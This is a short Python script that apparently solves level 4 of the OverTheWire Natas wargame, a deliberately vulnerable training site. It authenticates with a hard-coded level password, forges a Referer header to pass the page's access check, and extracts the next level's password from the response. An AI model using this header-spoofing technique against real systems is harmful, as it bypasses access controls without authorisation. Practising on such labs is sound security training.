import re
import requests

level = 4
creds = ('natas4','Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
url   = 'http://natas%s.natas.labs.overthewire.org' % level
header = {'Referer':'http://natas5.natas.labs.overthewire.org/'}
session=requests.Session()
response = requests.get(url,auth=creds, headers=header)
data = response.text
print(re.findall('Access granted. The password for natas5 is (.*)',data))